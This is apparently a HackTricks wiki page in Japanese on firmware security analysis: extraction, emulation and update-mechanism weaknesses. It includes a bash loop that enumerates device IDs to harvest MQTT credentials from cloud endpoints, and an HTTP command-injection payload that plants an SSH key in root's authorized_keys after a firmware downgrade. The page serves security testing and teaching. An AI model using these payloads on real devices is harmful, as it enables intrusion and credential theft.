# ファームウェア分析

{{#include ../../banners/hacktricks-training.md}}

## **イントロダクション**

### 関連リソース


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

ファームウェアは、デバイスが正しく動作するために不可欠なソフトウェアであり、ハードウェアコンポーネントとユーザが触れるソフトウェアの間の通信を管理・仲介します。ファームウェアは不揮発性メモリに格納され、電源投入直後からデバイスが重要な命令にアクセスできるようにして、オペレーティングシステムの起動へとつながります。ファームウェアを調査・改変することは、セキュリティ脆弱性を特定する上で重要なステップです。

## **情報収集**

**情報収集**は、デバイスの構成や使用技術を理解するための重要な初期段階です。このプロセスでは以下のようなデータを収集します:

- CPUアーキテクチャと実行されるオペレーティングシステム
- bootloader の詳細
- ハードウェア構成とデータシート
- コードベースのメトリクスとソースの場所
- 外部ライブラリとライセンス種別
- 更新履歴と規制認証
- アーキテクチャ図およびフロー図
- セキュリティ評価と特定された脆弱性

この目的のため、**open-source intelligence (OSINT)** ツールは非常に有用であり、利用可能なオープンソースソフトウェアコンポーネントの手動および自動解析も重要です。[Coverity Scan](https://scan.coverity.com) や [Semmle’s LGTM](https://lgtm.com/#explore) のようなツールは、潜在的な問題を見つけるために活用できる無料の静的解析を提供します。

## **ファームウェアの入手**

ファームウェアの入手方法はいくつかあり、それぞれ難易度が異なります:

- **直接**（開発者、メーカー）から
- 提供された手順に従って**ビルド**する
- 公式サポートサイトから**ダウンロード**する
- ホストされているファームウェアファイルを見つけるために **Google dork** クエリを利用する
- **cloud storage** に直接アクセスする（例: [S3Scanner](https://github.com/sa7mon/S3Scanner)）
- **man-in-the-middle** 技術で更新を傍受する
- UART、JTAG、または PICit のような接続を通じてデバイスから**抽出**する
- デバイス通信内のアップデート要求を**スニッフィング**する
- ハードコードされた更新エンドポイントを特定して利用する
- bootloader またはネットワークから**ダンプ**する
- すべてが失敗した場合は、適切なハードウェアツールを使ってストレージチップを**取り外し**、読み取る

## ファームウェアの解析

ファームウェアを入手したら、どのように扱うかを決めるために情報を抽出する必要があります。使用できるさまざまなツール:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
もしそれらのツールであまり見つからない場合は、イメージの**エントロピー**を `binwalk -E <bin>` で確認してください。エントロピーが低ければ暗号化されている可能性は低く、エントロピーが高ければ暗号化（または何らかの方法で圧縮）されている可能性が高いです。

さらに、これらのツールを使ってファームウェアに埋め込まれた**ファイルを抽出**できます：


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

あるいは [**binvis.io**](https://binvis.io/#/)（[code](https://code.google.com/archive/p/binvis/)）でファイルを調べることもできます。

### ファイルシステムの取得

前述のようなツール（例: `binwalk -ev <bin>`）を使えば、**ファイルシステムを抽出**できているはずです。\
Binwalk は通常、**ファイルシステム名をフォルダ名としたフォルダ**に抽出します。普通は次のいずれかになります: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 手動によるファイルシステム抽出

場合によっては、binwalk のシグネチャにファイルシステムのマジックバイトが含まれていないことがあります。その場合は、binwalk を使ってファイルシステムのオフセットを見つけ、バイナリから圧縮されたファイルシステムをカービングして、以下の手順に従ってタイプに応じてファイルシステムを**手動で抽出**してください。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
以下の **dd command** を実行して Squashfs filesystem を carving してください。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatively, the following command could also be run.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs の場合（上の例で使用）

`$ unsquashfs dir.squashfs`

Files will be in "`squashfs-root`" directory afterwards.

- CPIO アーカイブファイル

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 ファイルシステムの場合

`$ jefferson rootfsfile.jffs2`

- NAND flash 搭載の ubifs ファイルシステムの場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## ファームウェアの解析

ファームウェアを入手したら、その構造や潜在的な脆弱性を理解するために解析することが重要です。このプロセスでは、ファームウェアイメージから有用なデータを分析・抽出するための複数のツールを使用します。

### 初期解析ツール

バイナリファイル（以下 `<bin>` と表記）の初期調査のために、いくつかのコマンドを示します。これらのコマンドは、ファイルタイプの特定、文字列抽出、バイナリデータの解析、パーティションやファイルシステムの詳細把握に役立ちます：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
イメージの暗号化状況を評価するため、**エントロピー** を `binwalk -E <bin>` で確認します。エントロピーが低いと暗号化されていない可能性を示し、高いと暗号化または圧縮されている可能性を示します。

埋め込みファイルを抽出するには、**file-data-carving-recovery-tools** ドキュメントやファイル検査のための **binvis.io** などのツールやリソースが推奨されます。

### ファイルシステムの抽出

通常、`binwalk -ev <bin>` を使用するとファイルシステムを抽出でき、抽出先はしばしばファイルシステムの種類を名前にしたディレクトリ（例: squashfs、ubifs）になります。しかし、**binwalk** がマジックバイトの欠如によりファイルシステムの種類を認識できない場合は、手動で抽出する必要があります。これは `binwalk` でファイルシステムのオフセットを特定し、その後 `dd` コマンドでファイルシステムを切り出す、という手順です:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
その後、ファイルシステムの種類（例: squashfs, cpio, jffs2, ubifs）に応じて、内容を手動で抽出するために異なるコマンドが使用されます。

### ファイルシステム解析

ファイルシステムを抽出したら、セキュリティ上の欠陥を探します。安全でないネットワークデーモン、ハードコードされた資格情報、API エンドポイント、更新サーバ機能、未コンパイルのコード、起動スクリプト、オフライン解析用のコンパイル済みバイナリに注意を払います。

**主要な場所** と **項目** の確認対象には以下が含まれます:

- **etc/shadow** と **etc/passwd** — ユーザ資格情報
- **etc/ssl** の SSL 証明書と鍵
- 設定ファイルやスクリプトファイル（潜在的な脆弱性のため）
- さらなる解析のための組み込みバイナリ
- 一般的な IoT デバイスの web サーバやバイナリ

ファイルシステム内の機密情報や脆弱性を発見するのに役立つツールはいくつかあります:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) および [**Firmwalker**](https://github.com/craigz28/firmwalker) — 機密情報の検索用
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) — 総合的なファームウェア解析用
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), および [**EMBA**](https://github.com/e-m-b-a/emba) — 静的／動的解析用

### コンパイル済みバイナリのセキュリティチェック

ファイルシステムで見つかるソースコードおよびコンパイル済みバイナリの両方を脆弱性のために精査する必要があります。Unix バイナリ向けの **checksec.sh** や Windows バイナリ向けの **PESecurity** のようなツールは、悪用されうる保護のないバイナリを特定するのに役立ちます。

## 派生した URL トークン経由での cloud config と MQTT 資格情報の収集

多くの IoT ハブは、デバイスごとの設定を次のようなクラウドエンドポイントから取得します:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

ファームウェア解析中に、<token> がハードコードされたシークレットを使って device ID からローカルに導出されていることが見つかる場合があります。例:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計により、deviceId と STATIC_KEY を知る者は誰でも URL を再構築して cloud config を取得できるため、平文の MQTT 資格情報やトピックプレフィックスが明らかになることがよくあります。

実務的なワークフロー:

1) UART のブートログから deviceId を抽出する

- 3.3V UART アダプタ (TX/RX/GND) を接続してログを取得する:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 例えば、cloud config URL pattern と broker address を出力している行を探してください:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware から STATIC_KEY と token のアルゴリズムを復元する

- バイナリを Ghidra/radare2 に読み込み、config パス ("/pf/") または MD5 の使用箇所を検索する。
- アルゴリズムを確認する（例: MD5(deviceId||STATIC_KEY)）。
- Bash で token を導出し、ダイジェストを大文字にする:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config と MQTT credentials を収集する

- URL を作成し curl で JSON を取得し、jq でパースして secrets を抽出する:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT と弱い topic ACLs を悪用する（存在する場合）

- 取得した認証情報を使用して maintenance topics を購読し、機密性の高いイベントを探す:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 予測可能なデバイスIDの列挙（大規模に、許可を得た上で）

- 多くのエコシステムは、ベンダーの OUI/product/type バイトを埋め込み、その後に連番のサフィックスが続きます。
- 候補の ID を反復し、トークンを導出してプログラムで設定を取得できます：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
注意
- mass enumeration を試みる前に、必ず明示的な許可を取得してください。
- 可能な場合は、ターゲットハードウェアを変更せずに秘密を回収するために、emulation または static analysis を優先してください。


ファームウェアをエミュレートするプロセスは、デバイスの動作全体や個々のプログラムのいずれかに対する **dynamic analysis** を可能にします。 このアプローチはハードウェアやアーキテクチャの依存性で課題に直面することがありますが、root filesystem や特定の binaries を、Raspberry Pi のようなアーキテクチャと endianness が一致するデバイス、あるいは事前構築された virtual machine に移すことで、さらなるテストが容易になります。

### 個別バイナリのエミュレーション

単一のプログラムを調査する際は、プログラムの endianness と CPU architecture を特定することが重要です。

#### MIPS アーキテクチャの例

MIPS アーキテクチャのバイナリをエミュレートするには、次のコマンドを使用できます:
```bash
file ./squashfs-root/bin/busybox
```
必要なエミュレーションツールをインストールするには：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM アーキテクチャのエミュレーション

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### フルシステムエミュレーション

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## 実践における動的解析

At this stage, either a real or emulated device environment is used for analysis. It's essential to maintain shell access to the OS and filesystem. Emulation may not perfectly mimic hardware interactions, necessitating occasional emulation restarts. Analysis should revisit the filesystem, exploit exposed webpages and network services, and explore bootloader vulnerabilities. Firmware integrity tests are critical to identify potential backdoor vulnerabilities.

## ランタイム解析技法

Runtime analysis involves interacting with a process or binary in its operating environment, using tools like gdb-multiarch, Frida, and Ghidra for setting breakpoints and identifying vulnerabilities through fuzzing and other techniques.

## バイナリのエクスプロイトとProof-of-Concept

Developing a PoC for identified vulnerabilities requires a deep understanding of the target architecture and programming in lower-level languages. Binary runtime protections in embedded systems are rare, but when present, techniques like Return Oriented Programming (ROP) may be necessary.

## ファームウェア解析向けの準備済みOS

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.

## ファームウェア解析用の準備済みOS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は Internet of Things (IoT) デバイスのセキュリティ評価と penetration testing を支援するためのディストロです。必要なツールがすべてロードされた事前構成済みの環境を提供することで、多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): EmbedOS は Ubuntu 18.04 ベースの組み込み向けセキュリティテスト用オペレーティングシステムで、ファームウェアセキュリティテストツールがプリロードされています。

## ファームウェアのダウングレード攻撃と安全でないアップデート機構

Even when a vendor implements cryptographic signature checks for firmware images, **version rollback (downgrade) protection is frequently omitted**. When the boot- or recovery-loader only verifies the signature with an embedded public key but does not compare the *version* (or a monotonic counter) of the image being flashed, an attacker can legitimately install an **older, vulnerable firmware that still bears a valid signature** and thus re-introduce patched vulnerabilities.

典型的な攻撃のワークフロー:

1. **古い署名済みイメージを入手する**
* ベンダーの公開ダウンロードポータル、CDN、またはサポートサイトから取得する。
* モバイル/デスクトップの付属アプリから抽出する（例: Android APK の `assets/firmware/` 内）。
* VirusTotal、インターネットアーカイブ、フォーラムなどのサードパーティのリポジトリから取得する。
2. **イメージをデバイスにアップロードまたは配布する** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* 多くのコンシューマ向けIoTデバイスは、Base64でエンコードされたファームウェアのblobを受け取り、サーバ側でデコードしてリカバリ/アップグレードを起動する*unauthenticated*なHTTP(S)エンドポイントを公開しています。
3. ダウングレード後、最新版で修正された脆弱性（例えば後から追加された command-injection フィルタ）を悪用する。
4. オプションで、永続化を得た後に検出を避けるため最新のイメージを再度フラッシュしたり、アップデートを無効化したりする。

### 例：ダウングレード後の Command Injection
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
脆弱な（ダウングレードされた）ファームウェアでは、`md5` パラメータがサニタイズされることなくシェルコマンドに直接連結されており、任意のコマンド注入を可能にしている（ここでは SSH 鍵による root アクセスを有効化する例）。後のファームウェアでは基本的な文字フィルタが導入されたが、ダウングレード保護がないためその修正は無意味である。

### モバイルアプリからのファームウェア抽出

多くのベンダーは、コンパニオンモバイルアプリにフルのファームウェアイメージを同梱し、アプリが Bluetooth/Wi‑Fi 経由でデバイスを更新できるようにしている。これらのパッケージは、`assets/fw/` や `res/raw/` のようなパスで APK/APEX 内に暗号化されずに保存されていることが多い。`apktool`、`ghidra`、あるいは単純な `unzip` のようなツールを使えば、物理ハードウェアに触れずに署名済みイメージを取り出すことができる。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### アップデートロジック評価チェックリスト

* *update endpoint* の通信/認証は十分に保護されていますか (TLS + authentication)?
* デバイスはフラッシュ前に **version numbers** または **monotonic anti-rollback counter** を比較していますか？
* イメージは secure boot chain 内で検証されていますか（例: signatures が ROM code によりチェックされる）?
* userland code は追加の sanity checks を行いますか（例: allowed partition map、model number）?
* *partial* または *backup* の update フローは同じ validation logic を再利用していますか？

> 💡  上記のどれかが欠けている場合、プラットフォームはおそらく rollback attacks に対して脆弱です。

## 演習用の脆弱なファームウェア

ファームウェアの脆弱性を発見する練習には、以下の脆弱なファームウェアプロジェクトを出発点として使用してください。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 参考

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## トレーニングと認定

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
